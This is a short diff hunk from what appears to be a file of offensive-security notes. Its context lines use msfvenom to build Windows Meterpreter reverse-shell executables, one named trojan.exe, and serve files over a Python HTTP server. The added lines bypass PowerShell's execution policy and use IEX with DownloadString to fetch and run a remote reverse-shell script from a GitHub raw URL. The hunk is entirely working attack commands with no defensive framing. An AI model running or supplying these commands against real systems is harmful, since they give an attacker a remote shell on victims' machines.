@@ -12,6 +12,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.137 LPORT=4444 -
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe > trojan.exe
 
+Get-ExecutionPolicy
+
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/usuario/repo/main/Invoke-ReverseShell.ps1')
+
 
 python3 -m http.server 8080
 
